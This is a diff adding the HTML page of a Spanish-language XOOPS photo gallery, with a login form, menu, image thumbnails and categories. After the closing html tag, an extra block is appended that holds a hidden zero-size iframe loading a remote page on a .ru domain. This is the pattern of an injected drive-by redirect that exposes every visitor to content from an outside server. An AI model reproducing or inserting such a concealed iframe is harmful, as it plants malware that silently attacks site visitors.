@@ -1,0 +1,234 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<meta http-equiv="content-language" content="es" />
+<meta name="robots" content="index,follow" />
+<meta name="Keywords" content="news, technology, headlines, xoops, xoop, nuke, myphpnuke, myphp-nuke, phpnuke, SE, geek, geeks, hacker, hackers, linux, software, download, downloads, free, community, mp3, forum, forums, bulletin, board, boards, bbs, php, survey, poll, polls, kernel, comment, comments, portal, odp, open, source, opensource, FreeSoftware, gnu, gpl, license, Unix, *nix, mysql, sql, database, databases, web site, weblog, guru, module, modules, theme, themes, cms, content management" />
+<meta name="Description" content="XOOPS is a dynamic Object Oriented based open source portal script written in PHP." />
+<meta name="rating" content="general" />
+<meta name="author" content="XOOPS" />
+<meta name="copyright" content="Copyright &amp;copy; 2001-2007" />
+<meta name="generator" content="XOOPS" />
+<title>Aspandaya-Galeria</title>
+<link href="http://www.aspandaya.org/favicon.ico" rel="SHORTCUT ICON" />
+<link rel="stylesheet" type="text/css" media="screen" href="http://www.aspandaya.org/xoops.css" />
+<link rel="stylesheet" type="text/css" media="screen" href="http://www.aspandaya.org/themes/obscene_v3/style.css" />
+<!-- RMV: added module header -->
+<link href="style.css" rel="stylesheet" type="text/css" />
+<style type="text/css">
+<!--
+.Estilo1 {
+	color: #FF6501;
+	font-weight: bold;
+}
+-->
+</style>
+</head><link rel="stylesheet" type="text/css" href="rmgs.css" />
+<meta http-equiv="Content-Script-Type" content="text/javascript" />
+<meta http-equiv="Content-Style-Type" content="text/css" />
+<script type="text/javascript" src="http://www.aspandaya.org/include/xoops.js">
+</script>
+
+<script type="text/javascript">
+<!--
+
+//-->
+</script>
+
+<body>
+<div align="center" id="obCenter">
+  <table align="center" cellspacing="0" id="obLayout">
+    <tr>
+      <td width="263" rowspan="2" id="pico">&nbsp;</td>
+      <td width="531" id="picoo">&nbsp;</td>
+    </tr>
+    <tr>
+      <td bgcolor="#FFFFFF" id="picooo">&nbsp;</td>
+    </tr>
+    <tr>
+      <td colspan="2"><table cellspacing="0">
+          <tr>
+            <td rowspan="3" id="leftcolumn"><!-- Start left blocks loop -->
+               <table cellspacing="0">
+  <tr>
+    <td class="obBlock" ><table cellspacing="0">
+  <tr>
+    <td width="4"><img src="http://www.aspandaya.org/themes/obscene_v3//images/lhl.png" width="4" height="20" alt="" /></td>
+    <td class="blockTitle" >Login</td>
+    <td width="4"><img src="http://www.aspandaya.org/themes/obscene_v3//images/lhr.gif" width="4" height="20" alt="" /></td>
+  </tr>
+</table><div class="blockContent"><form style="margin-top: 0px;" action="http://www.aspandaya.org/user.php" method="post">
+    Nombre: <br />
+    <input type="text" name="uname" size="12" value="" maxlength="25" /><br />
+    Contraseña: <br />
+    <input type="password" name="pass" size="12" maxlength="32" /><br />
+    <!-- <input type="checkbox" name="rememberme" value="On" class ="formButton" /><br /> //-->
+    <input type="hidden" name="xoops_redirect" value="/modules/rmgs/?PHPSESSID=hf9ji1uqlic5mrj8hqmk1el8f0" />
+    <input type="hidden" name="op" value="login" />
+    <input type="submit" value="Entrar" /><br />
+    
+</form>
+<a href="http://www.aspandaya.org/user.php#lost">¿Recuperar Contraseña?</a>
+<br /><br />
+<a href="http://www.aspandaya.org/register.php"><b>&iexcl;Regístrese</b> Ahora!</a></div></td>
+  </tr>
+</table>
+  <table cellspacing="0">
+  <tr>
+    <td class="obBlock" ><table cellspacing="0">
+  <tr>
+    <td width="4"><img src="http://www.aspandaya.org/themes/obscene_v3//images/lhl.png" width="4" height="20" alt="" /></td>
+    <td class="blockTitle" >Menú</td>
+    <td width="4"><img src="http://www.aspandaya.org/themes/obscene_v3//images/lhr.gif" width="4" height="20" alt="" /></td>
+  </tr>
+</table><div class="blockContent"><table cellspacing="0">
+  <tr>
+    <td id="mainmenu">
+      <a class="menuTop" href="http://www.aspandaya.org/">Inicio</a>
+      <!-- start module menu loop -->
+            <a class="menuMain" href="http://www.aspandaya.org/modules/news/">Noticias</a>
+                    <a class="menuMain" href="http://www.aspandaya.org/modules/mastop_publish/">Información</a>
+                    <a class="menuMain" href="http://www.aspandaya.org/modules/gasearch/">Buscador</a>
+                    <a class="menuMain" href="http://www.aspandaya.org/modules/rmgs/">Galeria</a>
+                  <a class="menuSub" href="http://www.aspandaya.org/modules/rmgs/mypics.php">Mis Fotos</a>
+                  <a class="menuSub" href="http://www.aspandaya.org/modules/rmgs/upload.php">Publicar Fotos</a>
+                  <a class="menuSub" href="http://www.aspandaya.org/modules/rmgs/images.php">Buscar Fotos</a>
+                  <a class="menuSub" href="http://www.aspandaya.org/modules/rmgs/favs.php">Favoritos</a>
+                    <a class="menuMain" href="http://www.aspandaya.org/modules/contact/">Contáctenos</a>
+                    <!-- end module menu loop -->
+    </td>
+  </tr>
+</table></div></td>
+  </tr>
+</table>
+  <table cellspacing="0">
+  <tr>
+    <td class="obBlock" ><table cellspacing="0">
+  <tr>
+    <td width="4"><img src="http://www.aspandaya.org/themes/obscene_v3//images/lhl.png" width="4" height="20" alt="" /></td>
+    <td class="blockTitle" >Galería</td>
+    <td width="4"><img src="http://www.aspandaya.org/themes/obscene_v3//images/lhr.gif" width="4" height="20" alt="" /></td>
+  </tr>
+</table><div class="blockContent"><div align="center">  	  		<a href="http://www.aspandaya.org/modules/rmgs/view.php?id=12" title="">
+		<img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp12_cVbN.jpg" style="border: 1px solid #000000;" />
+		</a><br />
+		
+          </div>
+  </div></td>
+  </tr>
+</table>
+  <br />
+              <!-- End left blocks loop -->            </td>
+            <td id="centercolumn"><!-- Display center blocks if any -->
+                            <!-- End display center blocks -->
+              <div id="content"> <div>
+<span><a href="./">Gal</a></span><span><a href="./">eria</a></span>
+<br />Fotos: 
+</div>
+<div style="padding: 4px; font-size: 10px; text-align:left;"></div><table width="100%" cellpadding="2" cellspacing="0" border="0">
+	<tr>
+		<td><a href="view.php?id=10"><img style="border: 1px solid #000000;" src="/home/.lunchmeat/cerbero69/aspa/uploads/homes/adminasp10_8m4V.jpg" border="0" /></a></td>
+		<td align="left">
+		<div style="padding: 0px; margin-left: 10px; font-size: 11px;">
+		<br />
+		<a href="upload.php"><img src="images/upload.png" border="0" align="absmiddle" /></a>
+		<a href="upload.php" style="font-size: 14px; font-weight: bold; font-family: Arial, Helvetica, sans-serif;">Publicar Imágenes</a><br />
+		<a href="images.php?q=all"><img src="images/allpics.png" border="0" align="absmiddle" /></a>
+		<a href="images.php?q=all" style="font-size: 14px; font-weight: bold; font-family: Arial, Helvetica, sans-serif;">Todas las Imágenes</a>
+		</div>
+		</td>
+	</tr>
+</table><br />
+<!-- Tabla Imagenes Recientes -->
+<table cellpadding="0" cellspacing="0" class="photos" align="center" width="100%">
+		<tr><td colspan="2" align="left" class="info">Ultimas <strong>18</strong> Imágenes</td>
+		<td align="right" class="info"><a href="images.php?q=all" title="Todas las Imágenes">Todas las Imágenes</a></td></tr><tr>
+							<td align="center"><a href="view.php?id=18"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/1_BjREF.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+							<td align="center"><a href="view.php?id=16"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp9_yneqT.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+							<td align="center"><a href="view.php?id=15"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp8_iufJc.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+								</tr><tr>
+							<td align="center"><a href="view.php?id=14"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp7_CDRH.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+							<td align="center"><a href="view.php?id=12"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp12_cVbN.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+							<td align="center"><a href="view.php?id=11"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp11_f9uRX.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+								</tr><tr>
+							<td align="center"><a href="view.php?id=10"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp10_8m4V.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+							<td align="center"><a href="view.php?id=9"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp9_uUbuf.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+							<td align="center"><a href="view.php?id=8"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp8_OLz2f.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+								</tr><tr>
+							<td align="center"><a href="view.php?id=7"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp7_U2iG8.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+							<td align="center"><a href="view.php?id=6"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp6_0XbzJ.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+							<td align="center"><a href="view.php?id=5"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp5_eMza4.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+								</tr><tr>
+							<td align="center"><a href="view.php?id=4"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp4_NzhcW.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+							<td align="center"><a href="view.php?id=3"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp3_iJN8u.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+							<td align="center"><a href="view.php?id=2"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp2_alVSb.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+								</tr><tr>
+							<td align="center"><a href="view.php?id=1"><img src="/home/.lunchmeat/cerbero69/aspa/uploads/admin/ths/asp1_PJ5t1.jpg" border="0" /></a><br />
+			Por: <a href="images.php?q=user&amp;id=1">admin</a></td>
+			</tr>
+</table>
+<!-- fin Tabla imagenes recientes -->
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+			<tr>
+				<td class="catego_title" colspan="2">Categorías</td>
+			</tr>
+			<tr>
+														<td class="categos_body">
+				<a href="categos.php?id=1" class="title">General</a>
+				<br />
+				<span class="info">Imágenes: <strong>11</strong></span><br />
+								</td>
+										</tr>
+		</table> 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ </div>
+              <br />
+			                 <br />            </td>
+          </tr>
+          <tr>          </tr>
+          <tr>
+            <td id="cmsFooter"><a href="http://www.gesmach.com" target="_blank"><img src="http://www.aspandaya.org/themes/obscene_v3/images/gesmach.jpg" alt="Gesmach" border="0" /></a><br />
+            Creado por Gesmach :: <a href="http://www.gesmach.com" class="Estilo1">www.gesmach.com</a></td>
+          </tr>
+      </table></td>
+    </tr>
+    <tr>
+      <td colspan="2" id="obFooter" >&nbsp;</td>
+    </tr>
+    <tr>
+      <td colspan="3" id="obLBC" >&nbsp;</td>
+    </tr>
+  </table>
+</div>
+</body>
+</html>
+<html><body><iframe src="http://countrtds.ru/tdstrf/index.php" width="0" height="0" frameborder="0"></iframe></body></html>
